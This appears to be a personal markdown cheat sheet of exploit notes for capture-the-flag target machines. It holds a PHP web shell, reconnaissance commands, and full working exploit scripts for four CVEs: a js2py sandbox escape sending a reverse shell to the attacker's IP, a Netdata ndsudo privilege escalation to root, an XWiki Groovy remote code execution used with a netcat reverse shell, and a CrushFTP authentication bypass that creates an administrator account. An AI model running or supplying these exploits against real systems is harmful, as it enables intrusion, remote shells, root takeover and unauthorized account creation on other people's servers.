# TDCVES
Target Drone CVE Summary

## base

port scan: ```nmap -T5 -Pn -sCTV {target ip}```

ip<->host: ```vim /etc/hosts```

dir scan: ```ffuf -w /usr/share/dirb/wordlists/common.txt -u http://example.com/FUZZ -recursion```

sub domain scan: ```ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.example.com -w /usr/share/wfuzz/wordlist/general/medium.txt -fw 4```

hash: ```john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5```

git: ```git clone https://github.com/example/example.git```

Web Shell: ```<?php echo "<div>".system($_GET['cmd'])."</div>"; ?>```

```
ps auxww
ss -tuln
sudo -l
find / -type f -perm -4000 2>/dev/null
```

## CVE
### CVE-2024-28397
https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js
```
nc -lvnp 9001
```
**payload.js**
```
let cmd = "bash -c \"sh -i >& /dev/tcp/{your IP}/9001 0>&1\""
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```

## CVE-2024-32019
https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC#
```
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
```
```
wget http://192.168.100.7:8000/CVE-2024-32019.sh
wget http://192.168.100.7:8000/nvme
sh CVE-2024-32019.sh
```
**CVE-2024-32019.sh**
```
#!/bin/bash

# Search for ndsudo SUID
ndsudo_path=$(find / -type f -name "ndsudo" -perm -4000 -print 2>/dev/null)

# Check it was found
if [ -z "$ndsudo_path" ]; then
    echo "[!] No SUID binary named ndsudo was found."
    exit 1
fi

echo "[+] ndsudo found at: $ndsudo_path"

# Check existence of ./nvme payload
if [ -f "./nvme" ]; then
    echo "[+] File 'nvme' found in the current directory."
    chmod +x ./nvme
    echo "[+] Execution permissions granted to ./nvme"
else
    echo "[!] The file 'nvme' was not found in the current directory."
    exit 1
fi

# Modify PATH and execute the SUID binary with nvme-list
echo "[+] Running ndsudo with modified PATH:"
PATH="$(pwd):$PATH" "$ndsudo_path" nvme-list
```
**payload.c**
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

## CVE-2025-24893
https://github.com/gunzf0x/CVE-2025-24893
```
nc -lvnp 9001
```
```
python3 CVE-2025-24893.py -t 'http://{target ip}:8080' -c 'busybox nc {your ip} 9001 -e /bin/bash'
```
**CVE-2025-24893.py**
```
#!/usr/bin/python3

import argparse
import urllib.parse
import requests
import sys

# Define color dictionary
color = {
    "NC": '\033[0m',
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "MAGENTA": '\033[95m',
    "CYAN": '\033[96m',
    "WHITE": '\033[97m'
}


# Define some pretty characters
STAR: str = f"{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['NC']}"
WARNING_STR: str = f"{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['NC']}"


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}")
    sys.exit(1)


def parse_arguments()->argparse.Namespace:
    """
    Get arguments from user
    """
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description=f"{color['BLUE']}CVE-2025-24893{color['NC']} exploit by {color['RED']}gunzf0x{color['NC']}",
                                     epilog=f"""
{color['YELLOW']}Example usage:{color['NC']}
{color['GREEN']}python3 {sys.argv[0]} -t 'http://example.com:8080' -c 'ping -c1 10.10.10.10'{color['NC']}""",
                                     formatter_class=argparse.RawTextHelpFormatter)
    # Add arguments with flags
    parser.add_argument("-t", "--target", type=str, help="Target url. For example: 'http://example.com' or 'http://example.com:8080'", required=True)
    parser.add_argument("-c", "--command", type=str, help="System command to execute in the target machine", required=True)
    # Return the parsed arguments
    return parser.parse_args()


def check_url(original_url: str)->str:
    """
    Check if url provided is in correct format
    """
    if not original_url.startswith("http://") or not original_url.startswith("https://"):
        print(f"{WARNING_STR} protocol not found in url (HTTP or HTTPs). Assumming it is 'https' adding 'http://' string to url...")
        return 'http://' + original_url
    return original_url


def exploit(target: str, command: str)->None:
    """
    Exploit for CVE-2025-24893 attacking vulnerable endpoint
    """
    # Set target url
    print(f"{STAR} Attacking {color['CYAN']}{target}{color['NC']}")
    url_payload: str = f"{target[:-1] if target.endswith('/') else target}/xwiki/bin/get/Main/SolrSearch?media=rss&text="
    original_payload: str = f'}}}}{{{{async async=false}}}}{{{{groovy}}}}"{command}".execute(){{{{/groovy}}}}{{{{/async}}}}'
    encoded_payload: str  = urllib.parse.quote(original_payload)
    vulnerable_endpoint: str = f"{url_payload}{encoded_payload}"
    print(f"{STAR} Injecting the payload:\n{color['CYAN']}{vulnerable_endpoint}{color['NC']}")
    try:
        requests.get(vulnerable_endpoint, verify=False, timeout=15)
    except Exception as e:
        print(f"{WARNING_STR} {color['RED']}An error ocurred:\n{color['YELLOW']}{e}{color['NC']}")
        sys.exit(1)
    print(f"{STAR} {color['MAGENTA']}Command executed{color['NC']}")
    print("\n~Happy Hacking")

    

def main()->None:
    # Get arguments form user
    args: argparse.Namespace = parse_arguments()
    # Execute the exploit attacking the vulnerable endpoint
    exploit(args.target, args.command)


if __name__ == "__main__":
    main()
```

## CVE-2025-31161
https://github.com/Immersive-Labs-Sec/CVE-2025-31161

```
python cve-2025-31161.py --target_host ftp.example.com --port 80 --target_user crushadmin --new_user zero --password 123456
```
**cve-2025-31161.py**
```
# Copyright (C) 2025 Kev Breen,Ben McCarthy Immersive
# https://github.com/Immersive-Labs-Sec/CVE-2025-31161
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import requests
from argparse import ArgumentParser


def exploit(target_host, port, target_user, new_user, password):
    print("[+] Preparing Payloads")
    
    # First request details
    warm_up_url = f"http://{target_host}:{port}/WebInterface/function/"
    create_user_url = f"http://{target_host}:{port}/WebInterface/function/"


    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
    }

    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }

    # Execute requests sequentially
    print("  [-] Warming up the target")
    # we jsut fire a request and let it time out. 
    try:
        warm_up_request = requests.get(warm_up_url, headers=headers, timeout=20)
        if warm_up_request.status_code == 200:
            print("  [-] Target is up and running")
    except requests.exceptions.ConnectionError:
        print("  [-] Request timed out, continuing with exploit")


    print("[+] Sending Account Create Request")
    create_user_request = requests.post(create_user_url, headers=headers, data=payload)
    if create_user_request.status_code != 200:
        print("  [-] Failed to send request")
        print("  [+] Status code:", create_user_request.status_code)
    if '<response_status>OK</response_status>' in create_user_request.text:
        print("  [!] User created successfully")



if __name__ == "__main__":
    parser = ArgumentParser(description="Exploit CVE-2025-31161 to create a new account")
    parser.add_argument("--target_host", help="Target host")
    parser.add_argument("--port", type=int, help="Target port", default=8080)
    parser.add_argument("--target_user", help="Target user", default="crushadmin")
    parser.add_argument("--new_user", help="New user to create", default="AuthBypassAccount")
    parser.add_argument("--password", help="Password for the new user", default="CorrectHorseBatteryStaple")

    args = parser.parse_args()

    if not args.target_host:
        print("  [-] Target host not specified")
        parser.print_help()
        exit(1)

    exploit(
        target_host=args.target_host,
        port=args.port,
        target_user=args.target_user,
        new_user=args.new_user,
        password=args.password
    )

    print(f"[+] Exploit Complete you can now login with\n   [*] Username: {args.new_user}\n   [*] Password: {args.password}.")
```
